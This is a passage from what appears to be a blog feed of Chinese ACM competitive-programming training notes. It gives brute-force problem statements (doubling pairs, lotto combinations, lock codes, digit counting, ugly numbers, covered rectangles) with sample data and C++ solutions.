class="hljs-symbol">2 </span><span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-2"><a href="#Sample-Output-2" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">4<br>3<br></code></pre></td></tr></table></figure><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> e[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>];<br><span class="hljs-type">int</span> n,m;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initial</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>      <span class="hljs-keyword">if</span>(i==j)<br>       e[i][j]=<span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">else</span> <br>       e[i][j]=<span class="hljs-number">99999999</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">find</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">1</span>;k&lt;=n;k++)<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>       <span class="hljs-keyword">if</span>(e[i][j]&gt;e[i][k]+e[k][j])<br>        e[i][j]=e[i][k]+e[k][j];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)<br>    &#123;<br>        <span class="hljs-built_in">initial</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> a,b,c;<br>            cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>            e[a][b]=e[b][a]=c;<br>        &#125;<br>        <span class="hljs-built_in">find</span>();<br>        cout&lt;&lt;e[<span class="hljs-number">1</span>][n]&lt;&lt;endl;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> NEFUOJ </tag>
            
            <tag> Prim </tag>
            
            <tag> 搜索 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFU-2020大一寒假培训三（暴力）</title>
      <link href="/2020/12/eac8bff4.html"/>
      <url>/2020/12/eac8bff4.html</url>
      
        <content type="html"><![CDATA[<h1 id="A-二倍的问题"><a href="#A-二倍的问题" class="headerlink" title="A.二倍的问题"></a>A.二倍的问题</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">给定2到15个不同的正整数，你的任务是计算这些数里面有多少个数对满足：数对中一个数是另一个数的两倍。比如给定1<span class="hljs-number"> 4 </span>3<span class="hljs-number"> 2 </span>9<span class="hljs-number"> 7 </span>18 22，得到的答案是3，因为2是1的两倍，4是2个两倍，18是9的两倍。 <br></code></pre></td></tr></table></figure><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">输入包括<span class="hljs-built_in">n</span>组测试数据。每组数据包括一行，给出<span class="hljs-number">2</span>到<span class="hljs-number">15</span>个两两不同且小于<span class="hljs-number">100</span>的正整数。每一行最后一个数是<span class="hljs-number">0</span>，表示这一行的结束后，这个数不属于那<span class="hljs-number">2</span>到<span class="hljs-number">15</span>个给定的正整数。<br></code></pre></td></tr></table></figure><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">对每组输入数据，输出一行，给出有多少个数对满足其中一个数是另一个数的两倍。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">9</span> <span class="hljs-number">7</span> <span class="hljs-number">18</span> <span class="hljs-number">22</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span> <span class="hljs-number">8</span> <span class="hljs-number">10</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">7 </span><span class="hljs-number">5</span> <span class="hljs-number">11</span> <span class="hljs-number">13</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">3<br>2<br>0<br></code></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> vis[<span class="hljs-number">25</span>],a[<span class="hljs-number">25</span>];<br><span class="hljs-type">int</span> t,x,p,ans;<br>cin&gt;&gt;t;<br><span class="hljs-keyword">while</span>(t--)<br>&#123;<br><span class="hljs-built_in">memset</span>(vis,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(vis));<br>p=ans=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;x&amp;&amp;x)<br>&#123;<br>p++;<br>a[p]=x;<br>&#125;<br><span class="hljs-built_in">sort</span>(a+<span class="hljs-number">1</span>,a+p+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=p;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(vis[a[i]]==<span class="hljs-number">1</span>)ans++;<br>vis[<span class="hljs-number">2</span>*a[i]]=<span class="hljs-number">1</span>;<br>&#125;<br>cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="B-大乐透"><a href="#B-大乐透" class="headerlink" title="B.大乐透"></a>B.大乐透</h1><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">在小明曾经玩过的一种对号码的纸牌游戏(乐透)里,玩家必须从&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,……，<span class="hljs-number">49</span>&#125;中选择<span class="hljs-number">6</span>个数。玩Lotto的一个流行策略是（虽然它并不增加你赢的机会）：就是从这<span class="hljs-number">49</span>个数中，选出k（k&amp;gt;<span class="hljs-number">6</span>）个数组成一个子集S，然后只从S里拿出牌来玩几局游戏。例如，k=<span class="hljs-number">8</span>，s=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">21</span>,<span class="hljs-number">34</span>&#125;，那么有<span class="hljs-number">28</span>场可能的游戏：<span class="hljs-string">[1,2,3,5,8,13]</span>,<span class="hljs-string">[1,2,3,5,8,21]</span>,<span class="hljs-string">[1,2,3,5,8,34]</span>,<span class="hljs-string">[1,2,3,5,13,21]</span>,……,<span class="hljs-string">[3,5,8,13,21,24]</span>。<br>读取数字k和一组数S，输出由S中的数组成的所有可能的游戏。<br></code></pre></td></tr></table></figure><h3 id="Input-1"><a href="#Input-1" class="headerlink" title="Input"></a>Input</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">输入数据有多组，每组一行，每行有多个整数，其中第一个整数为数字k，接下来有k个整数，即子集S。当k为0，输入结束。<br></code></pre></td></tr></table></figure><h3 id="Output-1"><a href="#Output-1" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">输出由S中的数组成的所有可能的游戏。每种游戏一行。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-1"><a href="#Sample-Input-1" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">7 </span><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-1"><a href="#Sample-Output-1" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> k,num[<span class="hljs-number">1000</span>];<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>cin&gt;&gt;k;<br><span class="hljs-keyword">if</span>(k==<span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>&#123;<br>cin&gt;&gt;num[i];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;k;j++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> l=j+<span class="hljs-number">1</span>;l&lt;k;l++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m=l+<span class="hljs-number">1</span>;m&lt;k;m++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> n=m+<span class="hljs-number">1</span>;n&lt;k;n++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> o=n+<span class="hljs-number">1</span>;o&lt;k;o++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d %d %d %d\n&quot;</span>,num[i],num[j],num[l],num[m],num[n],num[o]);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="C-密码箱"><a href="#C-密码箱" class="headerlink" title="C.密码箱"></a>C.密码箱</h1><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">小明的密码箱打不开了，小明的密码箱是传统的<span class="hljs-number">3</span>位滚轮密码。小明完全不记得他的密码了，所以他从 <span class="hljs-number">000</span>开始以升序开始尝试，他已经试到第<span class="hljs-keyword">abc</span>位密码了，可是箱子还是没有打开，他希望你将之后所有可能尝试的密码输出，这样他就可以完全不去思考，让他波动密码盘更有效率<br></code></pre></td></tr></table></figure><h3 id="Input-2"><a href="#Input-2" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">每行输入一个整数<span class="hljs-built_in">n</span>(<span class="hljs-comment">0 &amp;lt; n &amp;lt; 1000</span>);<span class="hljs-built_in">n</span>没有前缀<span class="hljs-number">0</span>。<br></code></pre></td></tr></table></figure><h3 id="Output-2"><a href="#Output-2" class="headerlink" title="Output"></a>Output</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">n之后所有可能尝试的密码<span class="hljs-comment">;输出有前缀0的。</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Input-2"><a href="#Sample-Input-2" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">989<br></code></pre></td></tr></table></figure><h3 id="Sample-Output-2"><a href="#Sample-Output-2" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs">990<br>991<br>992<br>993<br>994<br>995<br>996<br>997<br>998<br>999<br></code></pre></td></tr></table></figure><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n+<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">1000</span>;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">10</span>)cout&lt;&lt;<span class="hljs-string">&quot;0&quot;</span>;<br><span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">100</span>)cout&lt;&lt;<span class="hljs-string">&quot;0&quot;</span>;<br>cout&lt;&lt;i&lt;&lt;endl;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="D-字符串统计"><a href="#D-字符串统计" class="headerlink" title="D.字符串统计"></a>D.字符串统计</h1><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">对于给定的一个字符串，统计其中数字字符出现的次数。<br></code></pre></td></tr></table></figure><h3 id="Input-3"><a href="#Input-3" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">输入数据有多组，第一行是一个整数<span class="hljs-built_in">n</span>，表示测试实例的个数，后面跟着<span class="hljs-built_in">n</span>行，每行包括一个由字母和数字组成的字符串。<br></code></pre></td></tr></table></figure><h3 id="Output-3"><a href="#Output-3" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">对于每个测试实例，输出该串中数值的个数，每个输出占一行。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-3"><a href="#Sample-Input-3" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2<br>asdfasdf123123asdfasdf<br>asdf111111111asdfasdfasdf<br></code></pre></td></tr></table></figure><h3 id="Sample-Output-3"><a href="#Sample-Output-3" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">6<br>9<br></code></pre></td></tr></table></figure><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,ans;<br>string s;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">while</span>(n--)<br>&#123;<br>ans=<span class="hljs-number">0</span>;<br>cin&gt;&gt;s;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;s.<span class="hljs-built_in">size</span>();i++)<br>&#123;<br><span class="hljs-keyword">if</span>(s[i]&gt;=<span class="hljs-string">&#x27;0&#x27;</span>&amp;&amp;s[i]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)ans++;<br>&#125;<br>cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="E-丑数"><a href="#E-丑数" class="headerlink" title="E.丑数"></a>E.丑数</h1><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">只有质数<span class="hljs-number">2,3,5,7</span>这几个作为因子的数叫做,丑数,比如前<span class="hljs-number">20</span>个丑数是(从小到大来说) <span class="hljs-number">1,2,3,4</span>,<span class="hljs-number">5,6,7,8</span>,<span class="hljs-number">9,10,12,14</span>,<span class="hljs-number">15,16,18,20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">24</span>和<span class="hljs-number">25</span>.<br></code></pre></td></tr></table></figure><h3 id="Input-4"><a href="#Input-4" class="headerlink" title="Input"></a>Input</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">我们给你个n（1<span class="hljs-symbol">&amp;lt;</span>=m<span class="hljs-symbol">&amp;lt;</span>=5842）当输入n为0结束。<br></code></pre></td></tr></table></figure><h3 id="Output-4"><a href="#Output-4" class="headerlink" title="Output"></a>Output</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">输出第<span class="hljs-built_in">n</span>个丑数。每个数一行。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-4"><a href="#Sample-Input-4" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>2<br>3<br>4<br>11<br></code></pre></td></tr></table></figure><h3 id="Sample-Output-4"><a href="#Sample-Output-4" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>2<br>3<br>4<br>12<br></code></pre></td></tr></table></figure><h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><p>这题打表过的，就不出了…</p><h1 id="F-矩形"><a href="#F-矩形" class="headerlink" title="F.矩形"></a>F.矩形</h1><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">在测试超大规模集成电路时，对给定的一个设计，专家要检测元件是否相互遮盖。一个元件可视为一个矩形，假设每个矩形都是水平排列的（边与<span class="hljs-keyword">x</span>轴或y轴平行），所以长方形由最小的和最大的<span class="hljs-keyword">x</span>，y坐标表示。<br>编程计算完全被覆盖的矩形个数。<br></code></pre></td></tr></table></figure><h3 id="Input-5"><a href="#Input-5" class="headerlink" title="Input"></a>Input</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">输入有多组长方形实例。对每组长方形，第一个数字是长方形的数量，然后是长方形的最小和最大<span class="hljs-keyword">x</span>，y坐标（最小<span class="hljs-keyword">x</span>，最大<span class="hljs-keyword">x</span>，最小y，最大y）。<br></code></pre></td></tr></table></figure><h3 id="Output-5"><a href="#Output-5" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">对每组输入数据，输出一行，是被完全覆盖的长方形数量。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-5"><a href="#Sample-Input-5" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">3</span><br><span class="hljs-symbol">100 </span><span class="hljs-number">101</span> <span class="hljs-number">100</span> <span class="hljs-number">101</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">101</span><br><span class="hljs-symbol">20 </span><span class="hljs-number">40</span> <span class="hljs-number">10</span> <span class="hljs-number">400</span><br><span class="hljs-number">4</span><br><span class="hljs-symbol">10 </span><span class="hljs-number">20</span> <span class="hljs-number">10</span> <span class="hljs-number">20</span><br><span class="hljs-symbol">10 </span><span class="hljs-number">20</span> <span class="hljs-number">10</span> <span class="hljs-number">20</span><br><span class="hljs-symbol">10 </span><span class="hljs-number">20</span> <span class="hljs-number">10</span> <span class="hljs-number">20</span><br><span class="hljs-symbol">10 </span><span class="hljs-number">20</span> <span class="hljs-number">10</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-5"><a href="#Sample-Output-5" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">0<br>4<br></code></pre></td></tr></table></figure><h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 